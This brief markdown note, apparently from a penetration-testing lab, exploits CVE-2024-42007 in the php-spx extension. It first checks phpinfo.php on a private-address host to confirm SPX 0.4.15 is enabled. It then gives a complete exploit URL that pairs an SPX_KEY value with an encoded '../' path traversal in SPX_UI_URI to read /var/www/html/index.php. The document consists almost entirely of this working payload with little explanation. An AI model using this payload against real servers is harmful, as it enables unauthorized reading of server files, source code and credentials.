# CVE-2024-42007 - php-spx Path Traversal Exploit

1. **First access and see** `SPX is enabled version is 0.4.15` at http://192.168.119.108/phpinfo.php

[image]

**Exploit:**

```
http://192.168.119.108/?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/var/www/html/index.php
```
